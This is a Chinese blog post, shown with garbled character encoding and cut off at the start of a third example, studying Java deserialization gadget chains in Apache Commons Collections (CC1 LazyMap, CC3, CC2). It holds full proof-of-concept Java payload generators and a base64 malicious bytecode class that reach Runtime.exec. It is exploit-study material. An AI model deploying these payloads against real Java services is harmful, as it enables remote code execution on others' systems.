·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†,å½“ç„¶è¿˜æœ‰ä¸ªå‰æ:å°±æ˜¯è§¦å‘TransformedMapä¸­çš„é‚£ä¸‰ä¸ªæ–¹æ³•,è¿™ä¹Ÿå°±æ˜¯å…³é”®çš„åœ°æ–¹äº†,è¿™ä¸‰ä¸ªæ–¹æ³•çš„ç±»å‹éƒ½æ˜¯protected,å‰ä¸¤ä¸ªç”±ä¸‹é¢è¿™ä¸¤ä¸ªpublicæ–¹æ³•è°ƒç”¨ è€ŒcheckSetValueåˆ™å¯ä»¥ä»æ³¨é‡Šä¸­çœ‹åˆ°,å½“è°ƒç”¨è¯¥ç±»çš„setvalueæ–¹æ³•æ—¶,ä¼šè‡ªåŠ¨è°ƒç”¨checkSetValueæ–¹æ³•,è€Œè¯¥ç±»çš„setValueæ–¹æ³•åˆ™ç»§æ‰¿äºå®ƒçš„çˆ¶ç±»AbstractInputCheckedMapDecorator å»å®ƒçš„çˆ¶ç±»çœ‹ä¸€ä¸‹ AbstractInputCheckedMapDecorator è¿™é‡Œçš„this.parentä¼ å…¥çš„å°±æ˜¯TransformedMap,AbstractInputCheckedMapDecorator çš„æ ¹çˆ¶ç±»å®é™…å°±æ˜¯ Map ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨åªéœ€è¦æ‰¾åˆ°ä¸€å¤„ readObject æ–¹æ³•ï¼Œåªè¦å®ƒè°ƒç”¨äº† Map.setValue() æ–¹æ³•,å³å¯å®Œæˆæ•´ä¸ªååºåˆ—åŒ–é“¾ã€‚(è¿™é‡Œæ¶‰åŠä¸€äº›å¤šæ€çš„çŸ¥è¯†) ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥çœ‹æ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„ AnnotationInvocationHandler ç±»ï¼Œè¯¥ç±»å±äº JDK1.7 è‡ªå¸¦ AnnotationInvocationHandler AnnotationInvocationHandlerç±»çš„readObject æ–¹æ³•ä¸­çœ‹åˆ° setValue æ–¹æ³•çš„è°ƒç”¨ è¿™é‡Œå…ˆçœ‹çœ‹å®ƒçš„æ„é€ å‡½æ•° è¿™é‡Œå…ˆç›´æ¥ç»™å‡ºä¸¤ä¸ªæ¡ä»¶ï¼š sun.reflect.annotation.AnnotationInvocationHandler æ„é€ å‡½æ•°çš„ç¬¬â¼€ä¸ªå‚æ•°å¿…é¡»æ˜¯ Annotationçš„â¼¦ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰â¾„å°‘â¼€ä¸ªâ½…æ³•ï¼Œå‡è®¾â½…æ³•åæ˜¯X è¢« TransformedMap.decorate ä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰â¼€ä¸ªé”®åä¸ºXçš„å…ƒç´  æ‰€ä»¥ï¼Œåœ¨Retentionæœ‰â¼€ä¸ªâ½…æ³•ï¼Œåä¸ºvalueï¼›æ‰€ä»¥ï¼Œä¸ºäº†å†æ»¡â¾œç¬¬â¼†ä¸ªæ¡ä»¶ï¼Œæˆ‘éœ€è¦ç»™Mapä¸­æ”¾â¼Šâ¼€ä¸ªKeyæ˜¯valueçš„å…ƒç´ ï¼š innerMap.put(&quot;value&quot;, &quot;xxxx&quot;); æ¥ä¸‹æ¥æ¥åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆéœ€è¦æœ‰ä¸€ä¸ªæ–¹æ³•åå’Œæˆ‘ä»¬keyä¸€æ · AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) { this.type = var1; //this.typeæ˜¯æˆ‘ä»¬ä¼ å…¥çš„Annotationç±»å‹Class this.memberValues = var2; //memberValuesä¸ºæˆ‘ä»¬ä¼ å…¥çš„map } else { throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); } } private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); //è·Ÿè¿›getInstance,è¿™é‡Œå…ˆçœ‹ä¸‹é¢çš„å›¾ç‰‡ä»¥åŠæ–‡å­— } catch (IllegalArgumentException var9) { throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); } Map var3 = var2.memberTypes(); //è¿™ä¸ªæ–¹æ³•è¿”å›var2.memberTypes,æˆ‘ä»¬çš„memberTypesæ˜¯ä¸€ä¸ªhashmap,è€Œä¸”keyä¸º&quot;value&quot; Iterator var4 = this.memberValues.entrySet().iterator();//memberValuesä¸ºæˆ‘ä»¬ä¼ å…¥çš„map while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); //éå†map String var6 = (String)var5.getKey();//è·å–mapçš„key,è¿™é‡Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå€¼ä¸ºvalueçš„key,ä»¤var6=&quot;value&quot; Class var7 = (Class)var3.get(var6);//åœ¨var3ä¸­æ‰¾keyä¸ºvar6çš„å€¼,å¦‚æœåœ¨è¿™é‡Œæ²¡æœ‰æ‰¾åˆ°,åˆ™è¿”å›äº†null,æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªAnnotationç±»å‹æœ‰æ–¹æ³•åä¸ºæˆ‘ä»¬mapçš„key if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); } } } } var1.getAnnotationTypeè·Ÿè¿›var1.getAnnotationTypeæ–¹æ³• è¿™é‡Œå‰é¢ä¸¤ä¸ªç›´æ¥è¿‡äº†,æ¥åˆ°äº†ç¬¬ä¸‰æ­¥,new AnnotationType(var0),è¿™é‡Œvar0ä¸ºæˆ‘ä»¬ä¼ å…¥çš„Annotationç±»å‹Classè·Ÿè¿›å» åé¢è¿”å›äº†Annotationç±»å‹çš„æ‰€æœ‰Methodsã€‚æ¥ç€éå†çš„å®ƒçš„æ‰€æœ‰æ–¹æ³•,è¿™é‡Œç»è¿‡äº†ä¸€ä¸ªforå¾ªç¯,var6æ˜¯è·å¾—çš„Methods,var7æ¥ç€è·å–äº†æ–¹æ³•åã€‚ç„¶åå°†è¿”å›çš„æ–¹æ³•åputåˆ°äº†memberTypesä¸­,è¿™é‡Œæ¯”è¾ƒå…³é”®,åé¢ä¼šç”¨ä¸Š,ç°åœ¨å¤§å®¶å°±è®°ä½memberTypesæ˜¯ä¸€ä¸ªhashmapå¯¹è±¡,é‡Œé¢çš„keyæ˜¯æˆ‘ä»¬ä¼ å…¥çš„Annotationç±»å‹Classçš„æ–¹æ³•åå­— æ€»ç»“ä¸€ä¸‹è¿™ä¸€æ®µå°±ç±»ä¼¼äºè¿™æ®µä»£ç : java.lang.annotation.Retentionåœ¨è¯¥ç±»ä¸­æœ‰ä¸€ä¸ªvalueæ–¹æ³• æ‰€ä»¥æˆ‘ä»¬mapç±»å†ä¼ ä¸€ä¸ª innermap.put(&quot;value&quot;, &quot;xxx&quot;); å…¶å®è¿™é‡Œä¸æ­¢è¿™ä¸€ä¸ªç±»å¯ä»¥ä½¿ç”¨,å¦‚java.lang.annotation.Target ä¹Ÿå¯ æµç¨‹å›¾ lazymapé“¾POCimport java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; public class CommonCollections12 { public static Object generatePayload() throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;calc&quot; }) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(&quot;value&quot;, &quot;xxx&quot;); Map outmap = LazyMap.decorate(innermap,transformerChain); //é€šè¿‡åå°„è·å¾—AnnotationInvocationHandlerç±»å¯¹è±¡ Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //é€šè¿‡åå°„è·å¾—clsçš„æ„é€ å‡½æ•° Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); //è¿™é‡Œéœ€è¦è®¾ç½®Accessibleä¸ºtrueï¼Œå¦åˆ™åºåˆ—åŒ–å¤±è´¥ ctor.setAccessible(true); //é€šè¿‡newInstance()æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡ InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap); Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler); Object instance = ctor.newInstance(Retention.class, mapProxy); return instance; } public static void main(String[] args) throws Exception { payload2File(generatePayload(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //å°†æ„é€ å¥½çš„payloadåºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­ ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //è¯»å–å†™å…¥çš„payloadï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ– ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } è°ƒç”¨é“¾ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() è¿™é‡Œçš„ååŠæ®µå’Œå‰é¢ä¸€æ ·,æ‰€ä»¥æˆ‘ä»¬åªç”¨çœ‹å‰é¢å°±è¡Œäº† lazymapåœ¨lazymapä¸­æœ‰ä¸€ä¸ªgetæ–¹æ³•,å¯ä»¥æ‰§è¡Œfactoryæˆå‘˜çš„transformæ–¹æ³•,è¿™é‡Œ è¿™é‡Œfactoryå¯æ§,ifæ¡ä»¶ä¹ŸæŒºå¥½è¿›å…¥çš„,å°†æˆ‘ä»¬ä¼ å…¥çš„mapä¸è¦æœ‰åé¢ä¼ å…¥çš„keyå°±è¡Œ æˆ‘ä»¬æ¥ä¸‹æ¥åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªreadObjectæ–¹æ³•è°ƒç”¨äº†è¯¥getæ–¹æ³•å³å¯ AnnotationInvocationHandler å…¶å®åœ¨è¯¥ç±»ä¸­çš„readObjectæ–¹æ³•ä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°èƒ½æœ‰ç›´æ¥å¼•ç”¨mapçš„getæ–¹æ³•çš„,ä½†æ˜¯æœ‰ä¸€ä¸ªinvokeä¸­å¯ä»¥æ‰§è¡Œgetæ–¹æ³•,è¿™å°±éœ€è¦å¼•å…¥ä¸€ç‚¹ç‚¹javaä»£ç†çš„çŸ¥è¯† è¿™é‡Œå°±ç®€å•çš„æä¸€ä¸‹: InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); //åˆ›å»ºä¸€ä¸ªInvocationHandleræ¥å£çš„å¯¹è±¡ Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); //ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»åŠ è½½å™¨,ç¬¬äºŒä¸ªå‚æ•°ç±»å‹,ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥æˆ‘ä»¬çš„æ¥å£ å½“æˆ‘ä»¬å¼•ç”¨proxyMapä¸­çš„æ–¹æ³•æ—¶,ä¼šå…ˆåœ¨handlerä¸­çš„invokeæ–¹æ³•ä¸­è¿›è¡Œä¿®é¥°,æ‰§è¡Œinvokeé‡Œçš„ä»£ç  æˆ‘ä»¬çš„memberValuesæˆå‘˜ä¸ºlazymapå¯¹è±¡(memberValuesçš„èµ‹å€¼åœ¨æ„é€ å‡½æ•°ä¸­,ä¸”æˆ‘ä»¬å¯æ§),å½“æˆ‘ä»¬æ‰§è¡Œåˆ°ä¸‹é¢è¿™é‡Œçš„æ—¶å€™,å°±ä¼šè§¦å‘ä»£ç†æœºåˆ¶,ç„¶åè¿›å…¥Invokeæ–¹æ³•,ä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œ æµç¨‹å›¾ è°ƒè¯•æ—¶é‡åˆ°çš„é—®é¢˜æœ‰æ—¶åœ¨è¿›è¡Œè°ƒè¯•çš„æ—¶å€™æˆ‘æ˜¯æ²¡æœ‰è¿›å…¥ifè¯­å¥çš„,ä½†ä¹Ÿè«åå¥‡å¦™çš„å¼¹å‡ºäº†è®¡ç®—å™¨,è€Œä¸”æŒ‰ç…§æˆ‘ä»¬åŸæœ¬çš„æ€è·¯æ˜¯åº”è¯¥è¿›å…¥ifè¯­å¥çš„(super.mapä¸­æ˜¯ä¸å«æˆ‘ä»¬çš„keyçš„) ç„¶ååé¢åˆ‡æ¢äº†ä¸€ä¸‹æ‰“æ–­ç‚¹çš„ä½ç½®åˆå¯ä»¥è¿›å»äº†,æˆ‘è®¤ä¸ºè¿™é‡Œæ˜¯å› ä¸ºåœ¨è°ƒè¯•çš„æ—¶å€™ä¼šè°ƒç”¨ä¸€äº›æ–¹æ³•,ä»è€Œå½±å“äº†æˆ‘ä»¬çš„è°ƒè¯•(è¿™ä¸ªå‘æäº†æˆ‘å¤§åŠå¤©,å¸Œæœ›ä¸è¦æœ‰äººè·Ÿæˆ‘ä¸€æ ·å¡åœ¨åŒæ ·çš„ä½ç½®äº†å‘œå‘œå‘œ) ç»“è¯­CC1å¾ˆé‡è¦,åé¢å‡ æ¡é“¾å­ååŠæ®µå‡ ä¹éƒ½æ˜¯ç”¨CC1çš„","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"Javaå¤ç°","slug":"Javaå¤ç°","permalink":"https://pp1ove.gitee.io/tags/Javaå¤ç°/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"CCé“¾å­¦ä¹ -ä¸‹","slug":"CCé“¾å­¦ä¹ -ä¸‹","date":"2021-07-13T03:03:25.000Z","updated":"2021-07-19T13:01:03.045Z","comments":false,"path":"2021/07/13/CCé“¾å­¦ä¹ -ä¸‹/","link":"","permalink":"https://pp1ove.gitee.io/2021/07/13/CCé“¾å­¦ä¹ -ä¸‹/","excerpt":"","text":"CC3æµ‹è¯•ç¯å¢ƒ jdk1.7 Commons Collections 3.1 POCimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.bcel.util.ClassLoader; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import org.jboss.util.Base64; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC32 { public static void main(String[] args) throws Exception{ //å­—èŠ‚ç  byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;); //åå°„è®¾ç½® Field TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;Yasax1&quot;); setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); //Transformeræ•°ç»„ Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //LazyMapå®ä¾‹ Map uselessMap = new HashMap(); Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer); //åå°„è·å–AnnotationInvocationHandlerå®ä¾‹ Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap); //åŠ¨æ€ä»£ç†ç±»ï¼Œä¸ºäº†è§¦å‘ AnnotationInvocationHandler#invoke Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(handler1); oos.flush(); oos.close(); //æµ‹è¯•ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } //åå°„è®¾ç½® Field public static void setFieldValue(Object object, String fieldName, Object value) { try { Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); } catch (Exception e) { e.printStackTrace(); } } } è°ƒç”¨é“¾AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() è¿™é‡Œçš„å‰åŠæ®µå’ŒCC1æ˜¯ä¸€æ ·,å› ä¸ºè¿™é‡Œç”¨çš„å®éªŒç¯å¢ƒæ˜¯jdk1.7,å¦‚æœè¿™é‡Œå‰é¢è°ƒç”¨LazyMap.get()çš„é“¾å­æ¢æˆjdk1.8å¯ç”¨çš„,å°±èƒ½å®ç°åœ¨1.8ç‰ˆæœ¬ä¸‹è¿è¡Œã€‚CC3å°±æ˜¯ä¸ºäº†ç»•è¿‡â¼€äº›è§„åˆ™å¯¹InvokerTransformerçš„é™åˆ¶,å»æ‰äº† InvokerTransformer ,å¼•å…¥TemlatesImplç­‰æ–°é¢å­”,æ‰€ä»¥åœ¨æˆ‘ä»¬çš„pocä¸­,ä¸»è¦å˜åŒ–å°±æ˜¯Transformer[]é‡Œçš„å†…å®¹ æµç¨‹å›¾ TemlatesImplTransletClassLoaderç±»ç»§æ‰¿äº†ClassLoader å¹¶ä¸”é‡å†™äº†å®ƒçš„defineClass,ç”±å…¶çˆ¶ç±»çš„protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•,å¯ä»¥è¢«å…¶ä»–ç±»è°ƒç”¨ å…¶ä»–çš„åœ°æ–¹çœ‹çœ‹æµç¨‹å›¾åº”è¯¥å°±èƒ½çœ‹æ‡‚äº†ã€‚ ä¸€äº›å…¶ä»–ç‚¹åœ¨åˆ›å»ºTemplatesImplå¯¹è±¡æ—¶,æˆ‘ä»¬ä½¿ç”¨äº†setFieldValue æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ã€‚è¿™é‡Œè®¾ç½®äº†_nameå’Œ_bytecodesã€‚_nameè¿™é‡Œä¸èƒ½ä¸ºç©º,_bytecodesä¸ºæˆ‘ä»¬ä¼ å…¥çš„å­—èŠ‚ç ã€‚ ysoserialä¸­è¿˜è®¾ç½®äº†_tfactoryä¸ºTransformerFactoryImpl,å› ä¸ºTemplatesImpl#defineTransletClasses() æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°_tfactory.getExternalExtensionsMap(),ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ª_tfactory.getExternalExtensionsMap(),è€Œä¸”æˆ‘å°†_tfactoryè®¾ç½®ä¸ºnullä¹Ÿèƒ½è¿è¡Œã€‚åœ¨æˆ‘å°†jdkç‰ˆæœ¬æ›´æ¢ä¸ºäº†1.8åæ‰¾åˆ°äº†_tfactory.getExternalExtensionsMap(),è¿™é‡Œ_tfactoryè®¾ç½®åˆå§‹å€¼åº”è¯¥æ˜¯ç»™åé¢ç‰ˆæœ¬å‡†å¤‡çš„ã€‚ é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥çš„å­—èŠ‚ç åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢,å…ˆçœ‹ä¸€ä¸‹å®ƒçš„åç¼–è¯‘ä»£ç  import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class TemplatesImpl extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public TemplatesImpl() throws IOException { super(); Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;calc&quot;); } } è¿™é‡Œæœ‰ä¸ªå…³é”®ç‚¹,å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„ç±»éœ€è¦ç»§æ‰¿äºAbstractTransletç±»ã€‚ ä½†æ˜¯æˆ‘è¿™é‡Œåä¸ä¿¡,æˆ‘å°±ä¸ä¼ ç»§æ‰¿äºAbstractTransletçš„ç±»,æƒ³è¯•è¯•èƒ½ä¸èƒ½æ­£å¸¸æ‰§è¡Œã€‚é¦–å…ˆåœ¨defineTransletClassesä¸­ä¼šå¯¹æˆ‘ä»¬çš„æ¶æ„ç±»è¿›è¡Œåˆ¤æ–­ å¦‚æœçˆ¶ç±»ä¸æ˜¯AbstractTransletç±»çš„è¯åˆ™ä¼šè¿›å…¥elseè¯­å¥ã€‚è€Œ_auxClassesä¸ºNull,æ‰§è¡Œputæ–¹æ³•åˆ™ä¼šæŠ¥é”™ã€‚è¿™é‡Œ_auxClassesä¸èƒ½é€šè¿‡åå°„æ§åˆ¶,å› ä¸ºå®ƒæ˜¯Hashtableç±»å‹,Hashtableé‡Œé¢æœ‰transientç±»å‹æˆå‘˜ã€‚ ä½†æ˜¯ä¸Šé¢æœ‰ä¸€ä¸ªifè¯­å¥å¯ä»¥å¯¹_auxClassesè¿›è¡Œèµ‹å€¼,å°è¯•ä¿®æ”¹ä¸€ä¸‹poc,è¿™é‡Œæˆ‘ä¿®æ”¹äº†_bytecodesçš„é•¿åº¦,è®©å…¶è¿›å…¥äº†ifè¯­å¥ã€‚ æˆåŠŸå¯¹_auxClassesè¿›è¡Œäº†èµ‹å€¼,ç„¶åæˆ‘ä»¬ä¹‹å‰é‚£æ®µä»£ç åˆä¼šå¯¹_transletIndexè¿›è¡Œåˆ¤æ–­,å°äº0åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨åå°„ä¿®æ”¹_transletIndexçš„å€¼,æŠŠå®ƒä¿®æ”¹æˆäº†1ã€‚å½“æˆ‘ä»¥ä¸ºæˆ‘æˆåŠŸçš„æ—¶å€™,è¿˜æ˜¯æŠ¥é”™äº†ã€‚ defineTransletClassesæ–¹æ³•æˆ‘ä»¬é¡ºåˆ©é€šè¿‡äº†,ä½†æ˜¯å›åˆ°getTransletInstanceæ–¹æ³•çš„æ—¶å€™,åˆå‡ºç°äº†ä¸€æ®µè¿™æ ·çš„ä»£ç  AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); çœ‹æ¥è¿™é‡Œçš„é€»è¾‘å°±æ˜¯éœ€è¦æˆ‘ä»¬ä¼ å…¥çš„å­—èŠ‚ç ä¸­è‡³å°‘æœ‰ä¸€ä¸ªç±»æ˜¯ç»§æ‰¿ä¸AbstractTranslet CC2Apache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†â½€ç‰ˆæœ¬ï¼š commons-collections:commons-collections org.apache.commons:commons-collections4 å‰è€…æ˜¯è€ç‰ˆæœ¬,åé¢çš„æ˜¯æ–°ç‰ˆæœ¬ã€‚cc2å’Œcc4æ˜¯æ–°ç‰ˆæœ¬çš„,ä½†æ–°ç‰ˆæœ¬ä¸­è€ç‰ˆæœ¬çš„POCä¾æ—§å¯ç”¨,åªæ˜¯å¯èƒ½ç±»åæ–¹æ³•åæœ‰äº›å˜åŒ–ã€‚ æµ‹è¯•ç¯å¢ƒ jdk1.8 Commons Collections 4 POCimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xerces.internal.impl.dv.util.Base64; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC21{ public static void main(String[] args) { try{ 